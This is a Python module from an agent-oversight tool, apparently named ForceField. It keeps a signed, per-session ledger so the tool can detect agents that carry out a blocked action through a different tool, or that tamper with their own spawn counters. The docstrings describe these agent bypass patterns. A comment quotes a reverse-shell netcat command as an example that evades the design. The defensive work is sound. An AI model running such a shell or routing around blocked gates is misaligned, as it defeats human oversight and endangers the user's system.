#!/usr/bin/env python3
"""Per-session ledger of what passed a gate, what ForceField wrote itself, and
what was blocked.

Two consumers, both of which need to answer a question no single hook event can:

* ``file_watch_guard`` sees a filesystem change and must decide whether any tool
  call in this session accounts for it. A change nothing accounts for reached
  disk without passing a gate, which is the whole point of watching.
* ``filesystem_guard`` and ``security_dispatcher`` see a write and must decide
  whether an earlier *blocked* command named the same target. That is the bypass
  shape: refused through one tool, performed through another.

Neither question is answerable from the event in hand, so the answer has to be
written down. This module owns that file and nothing else.

**Append-only, one JSON object per line, no lock.** This is not a style choice;
it is the shape ``agent_guard`` arrived at after every read-modify-write variant
failed in a different place. Unlocked JSON rewriting lost updates and produced
invalid files under concurrency. Locked and unbounded, contention outlasted the
5 s hook timeout and took the verdict with it. Locked and bounded, the deadline
was obeyed and the state silently stopped being written at all. A single short
write to a regular file opened ``O_APPEND`` is atomic against concurrent
writers, so there is no critical section here to contend for and nothing to lose
an update to. Bounds are applied when the file is *read* instead.

**Every line carries an HMAC, and it is domain-separated from ``memo.py``'s.**
The ledger decides whether a write is attributable and whether an earlier block
correlates, so a forged line suppresses an ``ask`` — the same privilege gain a
forged memo gives, and it gets the same protection. It reuses ``memo.key``
rather than introducing a second key to protect, but ``memo.py`` signs with no
domain prefix, so without ``_MAC_DOMAIN`` here a genuinely-signed memo could be
replayed as a ledger line. The MAC also binds the session id, so a line cannot
be moved between sessions.

The MAC raises the bar to same-user, exactly as the memo store's does. Anything
running as this user can read ``memo.key``. It stops a hand-written line, not a
determined local process running as you.

Fail-open in every direction. An unreadable, corrupt or unverifiable ledger
yields "nothing recorded", which costs a missed correlation or a spurious
out-of-band record. Neither blocks a tool call.
"""

from __future__ import annotations

import errno
import hashlib
import hmac
import json
import os
import re
import stat
import sys
import time
from pathlib import Path
from typing import Any

sys.path.insert(0, str(Path(__file__).parent))
from hook_event import read_regular_tail  # noqa: E402

# Distinct from anything ``memo.py`` signs. See the module docstring.
_MAC_DOMAIN = b"forcefield-ledger-v1\0"

# Bounds. The measured bypass pairs all fell within 10 records of each other and
# well inside a minute, so a 15-minute window is generous rather than tight. The
# byte cap is what keeps the read on the critical path bounded no matter how
# long a session runs, and the entry cap is what keeps the parse bounded when a
# burst fits inside the byte cap.
MAX_LEDGER_BYTES = 65_536
MAX_ENTRIES = 20
TTL_SECONDS = 900

# What a session id may contain before it is interpolated into a file name. An
# allowlist, because the set of path separators is platform-dependent and a
# denylist of them is a promise about every platform ForceField runs on.
_SAFE_SESSION_ID = re.compile(r"[A-Za-z0-9._-]{1,128}")

# Fields the MAC covers, per kind. Listed rather than "everything except mac" so
# that adding a field is a deliberate decision about whether it is security
# relevant, not an implicit one.
_SIGNED_FIELDS = ("kind", "at", "path", "tool", "guard", "pattern",
                  "decision", "targets")

_KIND_GATE = "gate"
_KIND_SELF = "self"
_KIND_BLOCK = "block"


def state_dir() -> Path:
    """Where per-session state lives. Created owner-only.

    Deliberately *not* ``$TMPDIR``. ``agent_guard``'s spawn counter was a 0644
    file in a 0755 directory that no guard covered, so a constrained subagent
    could zero its own budget with a shell redirect and leave no record of it.
    Under ``~/.claude/forcefield/`` everything here inherits
    ``filesystem_guard``'s ``forcefield_memos`` config-sink coverage instead: a
    raw shell write prompts, and so does a write through Write/Edit.

    That does not make this state tamper-proof — anything running as this user
    can still reach it. It makes tampering *visible*, which is the property that
    was missing.

    This lives here rather than in ``agent_guard`` because it is now shared by
    three modules and ``agent_guard`` is the heaviest of them: reaching it from
    the ``PreToolUse[Write]`` path would pull the whole logging and credential
    stack in behind one path lookup. The direction of the dependency follows the
    cost, not the history.
    """
    directory = Path.home() / ".claude" / "forcefield" / "state"
    directory.mkdir(parents=True, exist_ok=True)
    try:
        os.chmod(str(directory.parent), 0o700)
        os.chmod(str(directory), 0o700)
    except OSError:
        pass
    return directory


def safe_session_id(session_id: str | None) -> str | None:
    """The session id if it can be part of a file name, else None."""
    if session_id and _SAFE_SESSION_ID.fullmatch(session_id):
        return session_id
    return None


def ledger_path(session_id: str | None) -> Path | None:
    """This session's ledger file, or None if the session id is unusable."""
    safe = safe_session_id(session_id)
    if safe is None:
        return None
    try:
        return state_dir() / ("ledger-%s.jsonl" % safe)
    except OSError:
        return None


def _key() -> bytes | None:
    """The HMAC key, shared with the memo store.

    ``memo`` is imported here rather than at module scope so that importing this
    module costs nothing on a path that never touches the ledger, and so that
    ``agent_guard`` importing ``state_dir`` does not drag the memo store in
    behind it. None on any failure, which makes every line fail verification —
    the safe direction, since an unverifiable ledger records nothing.
    """
    try:
        from memo import _store_key  # noqa: PLC0415

        return _store_key()
    except Exception:  # noqa: BLE001 - an unusable key is "no ledger", not a crash
        return None


def _mac(session_id: str, entry: dict[str, Any], key: bytes) -> str:
    payload = {field: entry.get(field) for field in _SIGNED_FIELDS}
    body = json.dumps(payload, sort_keys=True, separators=(",", ":"))
    return hmac.new(
        key,
        _MAC_DOMAIN + session_id.encode("utf-8") + b"\0" + body.encode("utf-8"),
        hashlib.sha256,
    ).hexdigest()


def _verified(session_id: str, entry: Any, key: bytes) -> dict[str, Any] | None:
    """One parsed line, if it is well-formed and genuinely ours."""
    if not isinstance(entry, dict):
        return None
    presented = entry.get("mac")
    if not isinstance(presented, str):
        return None
    if not hmac.compare_digest(presented, _mac(session_id, entry, key)):
        return None
    if not isinstance(entry.get("at"), (int, float)):
        return None
    return entry


def _open_append(path: Path) -> int:
    """Open the ledger 0600 from creation, refusing anything but a regular file.

    ``O_NONBLOCK`` plus the ``S_ISREG`` check on the *descriptor* is the pair
    every other opener in this codebase carries, for the reason measured in
    ``memo._open_private``: the state directory is under ``$HOME``, any same-uid
    process can replace a path in it, and a ``mkfifo`` at this name turns a
    0.04 s hook into a 5 s timeout kill with no verdict delivered. Checking the
    descriptor rather than the path is what makes it not a race.
    """
    flags = (os.O_WRONLY | os.O_CREAT | os.O_APPEND
             | getattr(os, "O_BINARY", 0) | getattr(os, "O_NONBLOCK", 0))
    descriptor = os.open(str(path), flags, 0o600)
    try:
        if not stat.S_ISREG(os.fstat(descriptor).st_mode):
            raise OSError(errno.EINVAL, "not a regular file", str(path))
    except BaseException:
        os.close(descriptor)
        raise
    return descriptor


def _append(session_id: str | None, entry: dict[str, Any]) -> bool:
    """Sign and append one entry. True if it reached disk.

    Never raises: every caller is past its verdict by the time it gets here, and
    a lost ledger line costs a correlation, not a decision.
    """
    path = ledger_path(session_id)
    if path is None:
        return False
    key = _key()
    if key is None:
        return False
    try:
        entry = dict(entry)
        entry.setdefault("at", time.time())
        entry["mac"] = _mac(session_id or "", entry, key)
        line = json.dumps(entry, separators=(",", ":")) + "\n"
        if len(line) > MAX_LEDGER_BYTES // 4:
            return False
        descriptor = _open_append(path)
        try:
            os.write(descriptor, line.encode("utf-8"))
        finally:
            os.close(descriptor)
        return True
    except (OSError, TypeError, ValueError):
        return False


def _read(session_id: str | None, kind: str, now: float | None) -> list[dict[str, Any]]:
    """Verified, unexpired entries of one kind, oldest first, newest capped.

    Bounds are applied here rather than at write time, which is what lets the
    writer stay a lock-free append. Reading the tail rather than the whole file
    means a long session cannot grow this read without limit.
    """
    path = ledger_path(session_id)
    if path is None:
        return []
    key = _key()
    if key is None:
        return []
    if now is None:
        now = time.time()
    try:
        raw = read_regular_tail(path, MAX_LEDGER_BYTES)
    except (OSError, ValueError):
        return []
    if not raw:
        return []

    entries: list[dict[str, Any]] = []
    # A tail read can start mid-line; that first fragment simply fails to parse.
    for line in raw.decode("utf-8", "replace").splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            parsed = json.loads(line)
        except ValueError:
            continue
        entry = _verified(session_id or "", parsed, key)
        if entry is None or entry.get("kind") != kind:
            continue
        if now - float(entry["at"]) > TTL_SECONDS:
            continue
        entries.append(entry)
    return entries[-MAX_ENTRIES:]


def record_gate(session_id: str | None, path: str, tool: str) -> bool:
    """Note that a gate saw this path, so a change to it is attributable."""
    return _append(session_id, {"kind": _KIND_GATE, "path": path, "tool": tool})


def record_self(session_id: str | None, path: str) -> bool:
    """Note that ForceField wrote this path itself.

    ``~/.claude/forcefield/`` is watched *and* written to by ForceField, so
    without this every ledger append, spawn counter and inspection verdict would
    produce a filesystem event that produced a record.

    The suppression this feeds is deliberately attribution-based rather than
    path-based. Excluding the state directory by path would also blind the guard
    to an agent editing the spawn counters, which is the specific thing the
    ``forcefield_memos`` sink exists to catch.
    """
    return _append(session_id, {"kind": _KIND_SELF, "path": path,
                                "tool": "forcefield"})


def record_block(session_id: str | None, guard: str, pattern: str | None,
                 decision: str, targets: list[str]) -> bool:
    """Note a blocked call and the file targets named in it."""
    if not targets:
        return False
    return _append(session_id, {
        "kind": _KIND_BLOCK,
        "guard": guard,
        "pattern": pattern or "",
        "decision": decision,
        "targets": targets[:MAX_ENTRIES],
    })


def attribution(session_id: str | None, path: str,
                now: float | None = None) -> str | None:
    """``"gate"``, ``"self"``, or None if nothing accounts for this path.

    None is the interesting answer and it does not mean "malicious": the user's
    own editor saving a watched file lands here, as does any background process.
    It means only that no gated tool call and no ForceField write in this session
    explains the change.
    """
    if not path:
        return None
    for kind in (_KIND_GATE, _KIND_SELF):
        for entry in _read(session_id, kind, now):
            if entry.get("path") == path:
                return kind
    return None


def pending_blocks(session_id: str | None,
                   now: float | None = None) -> list[dict[str, Any]]:
    """Blocked calls from this session that are still inside the TTL."""
    return _read(session_id, _KIND_BLOCK, now)


def correlate(session_id: str | None, path: str,
              now: float | None = None) -> dict[str, Any] | None:
    """The most recent block naming ``path``, or None.

    Most recent rather than first: when a target is refused twice, the block
    nearest the write is the one that describes what was just routed around.
    """
    if not path:
        return None
    if now is None:
        now = time.time()
    for entry in reversed(pending_blocks(session_id, now)):
        targets = entry.get("targets")
        if isinstance(targets, list) and path in targets:
            return {
                "guard": entry.get("guard", ""),
                "pattern": entry.get("pattern", ""),
                "decision": entry.get("decision", ""),
                "age_s": round(now - float(entry["at"]), 3),
            }
    return None


# Redirection and explicit output flags only. Every one of the 26 bypass pairs
# measured in the shipped logs used shell redirection, so this is the smallest
# extractor that covers the observed cases.
#
# The deliberate consequence: a block naming no file is never correlated. A
# denied ``nc -e /bin/sh 10.0.0.1 4444`` whose payload is then relocated into a
# freshly written script is NOT caught by this design. Correlating on payload
# instead of path was rejected because scanning write content against the
# deny-tier patterns fires on every test fixture and documentation page in this
# repository, both of which are full of exfil strings by construction.
_REDIRECT_TARGET = re.compile(r">>?\s*([^\s;|&<>()]+)")
_OUTPUT_FLAG = re.compile(r"(?:^|\s)(?:-o|--output(?:=|\s+))\s*([^\s;|&<>()]+)")


def extract_targets(command: str, cwd: str | None = None) -> list[str]:
    """Canonical absolute paths a blocked command would have written.

    Heredoc bodies and comments are stripped first, so the ``PY`` payload of
    ``cat > x.py <<'PY'`` cannot contribute targets of its own — the body is
    data being written, not a command that writes.
    """
    if not command:
        return []
    try:
        from shell_context import strip_comments, strip_heredocs  # noqa: PLC0415

        text = strip_comments(strip_heredocs(command))
    except Exception:  # noqa: BLE001 - a target list is never worth a failed hook
        text = command

    found: list[str] = []
    for pattern in (_REDIRECT_TARGET, _OUTPUT_FLAG):
        for match in pattern.finditer(text):
            candidate = match.group(1).strip("'\"")
            if not candidate or candidate.startswith("&"):
                continue
            if candidate.startswith("/dev/"):
                continue
            resolved = _canonical(candidate, cwd)
            if resolved and resolved not in found:
                found.append(resolved)
    return found[:MAX_ENTRIES]


def _canonical(path: str, cwd: str | None) -> str:
    """Absolute, symlink-resolved path, matching ``filesystem_guard._canonical``.

    Both sides of a correlation must canonicalize the same way or the comparison
    silently never matches: the blocked command names ``./out.sh`` and the write
    that follows names ``/Users/me/proj/out.sh``.
    """
    try:
        expanded = os.path.expanduser(os.path.expandvars(path))
        if not os.path.isabs(expanded):
            expanded = os.path.join(cwd or os.getcwd(), expanded)
        try:
            return os.path.realpath(expanded)
        except OSError:
            return os.path.normpath(expanded)
    except (OSError, ValueError):
        return ""
